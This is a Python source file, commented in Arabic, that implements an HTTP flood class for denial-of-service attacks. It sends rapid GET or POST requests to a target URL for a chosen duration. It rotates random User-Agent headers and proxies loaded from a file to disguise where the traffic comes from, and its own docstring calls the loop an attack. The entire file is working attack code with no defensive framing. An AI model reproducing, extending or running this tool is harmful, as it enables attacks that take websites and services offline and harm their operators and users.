#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import time
import threading
from fake_useragent import UserAgent

class HTTPFlood:
    def __init__(self, target, method="GET", use_proxies=False, stats_callback=None):
        self.target = target
        self.method = method.upper()
        self.use_proxies = use_proxies
        self.stats_callback = stats_callback
        self.session = requests.Session()
        self.ua = UserAgent()
        self.proxies_list = []
        
        if use_proxies:
            self.load_proxies()
            
    def load_proxies(self, filename="proxies.txt"):
        """تحميل البروكسيات من ملف"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self.proxies_list.append({'http': line, 'https': line})
            print(f"[+] تم تحميل {len(self.proxies_list)} بروكسي")
        except FileNotFoundError:
            print("[-] ملف البروكسيات غير موجود، سيتم العمل بدون بروكسيات")
            self.use_proxies = False
            
    def get_random_proxy(self):
        """الحصول على بروكسي عشوائي"""
        if self.proxies_list:
            return random.choice(self.proxies_list)
        return None
        
    def get_headers(self):
        """توليد هيدرز عشوائية"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
    def send_request(self):
        """إرسال طلب واحد"""
        try:
            headers = self.get_headers()
            proxy = self.get_random_proxy() if self.use_proxies else None
            
            if self.method == "GET":
                response = self.session.get(self.target, headers=headers, proxies=proxy, timeout=3)
            else:  # POST
                response = self.session.post(self.target, headers=headers, proxies=proxy, timeout=3)
                
            if self.stats_callback:
                self.stats_callback(success=(response.status_code < 500))
            return True
            
        except Exception:
            if self.stats_callback:
                self.stats_callback(success=False)
            return False
            
    def flood(self, duration):
        """تنفيذ هجوم لمدة محددة"""
        start_time = time.time()
        while time.time() - start_time < duration:
            self.send_request()
            # تأخير بسيط لتجنب الإفراط
            time.sleep(random.uniform(0.001, 0.01))
